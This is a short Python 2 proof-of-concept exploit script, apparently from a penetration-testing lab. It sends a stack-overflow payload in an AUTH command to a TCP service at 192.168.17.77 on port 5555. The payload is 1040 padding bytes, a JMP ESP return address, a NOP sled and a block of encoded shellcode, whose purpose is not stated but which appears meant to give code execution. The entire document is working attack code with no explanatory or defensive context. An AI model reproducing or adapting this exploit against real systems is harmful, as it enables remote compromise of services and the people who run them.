#!/usr/bin/python
import socket

shellcode = ("\xbb\xc8\xf5\xf8\xc4\xdb\xcf\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1"
            "\x52\x83\xed\xfc\x31\x5d\x0e\x03\x95\xfb\x1a\x31\xd9\xec\x59"
            "\xba\x21\xed\x3d\x32\xc4\xdc\x7d\x20\x8d\x4f\x4e\x22\xc3\x63"
            "\x25\x66\xf7\xf0\x4b\xaf\xf8\xb1\xe6\x89\x37\x41\x5a\xe9\x56"
            "\xc1\xa1\x3e\xb8\xf8\x69\x33\xb9\x3d\x97\xbe\xeb\x96\xd3\x6d"
            "\x1b\x92\xae\xad\x90\xe8\x3f\xb6\x45\xb8\x3e\x97\xd8\xb2\x18"
            "\x37\xdb\x17\x11\x7e\xc3\x74\x1c\xc8\x78\x4e\xea\xcb\xa8\x9e"
            "\x13\x67\x95\x2e\xe6\x79\xd2\x89\x19\x0c\x2a\xea\xa4\x17\xe9"
            "\x90\x72\x9d\xe9\x33\xf0\x05\xd5\xc2\xd5\xd0\x9e\xc9\x92\x97"
            "\xf8\xcd\x25\x7b\x73\xe9\xae\x7a\x53\x7b\xf4\x58\x77\x27\xae"
            "\xc1\x2e\x8d\x01\xfd\x30\x6e\xfd\x5b\x3b\x83\xea\xd1\x66\xcc"
            "\xdf\xdb\x98\x0c\x48\x6b\xeb\x3e\xd7\xc7\x63\x73\x90\xc1\x74"
            "\x74\x8b\xb6\xea\x8b\x34\xc7\x23\x48\x60\x97\x5b\x79\x09\x7c"
            "\x9b\x86\xdc\xd3\xcb\x28\x8f\x93\xbb\x88\x7f\x7c\xd1\x06\x5f"
            "\x9c\xda\xcc\xc8\x37\x21\x87\x36\x6f\x39\x3a\xdf\x72\x39\xd5"
            "\x43\xfa\xdf\xbf\x6b\xaa\x48\x28\x15\xf7\x02\xc9\xda\x2d\x6f"
            "\xc9\x51\xc2\x90\x84\x91\xaf\x82\x71\x52\xfa\xf8\xd4\x6d\xd0"
            "\x94\xbb\xfc\xbf\x64\xb5\x1c\x68\x33\x92\xd3\x61\xd1\x0e\x4d"
            "\xd8\xc7\xd2\x0b\x23\x43\x09\xe8\xaa\x4a\xdc\x54\x89\x5c\x18"
            "\x54\x95\x08\xf4\x03\x43\xe6\xb2\xfd\x25\x50\x6d\x51\xec\x34"
            "\xe8\x99\x2f\x42\xf5\xf7\xd9\xaa\x44\xae\x9f\xd5\x69\x26\x28"
            "\xae\x97\xd6\xd7\x65\x1c\xf6\x35\xaf\x69\x9f\xe3\x3a\xd0\xc2"
            "\x13\x91\x17\xfb\x97\x13\xe8\xf8\x88\x56\xed\x45\x0f\x8b\x9f"
            "\xd6\xfa\xab\x0c\xd6\x2e")

address = "\x71\xe8\xd4\x77"   #77D4E871   FFE4             JMP ESP

buffer = "A" * 1040 + address + "\x90" * 8 + shellcode
req1 = "AUTH " + buffer
print "\nSending evil buffer..."
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(("192.168.17.77",5555))
print repr(s.recv(1024))
s.send(req1)
print repr(s.recv(1024))
s.close()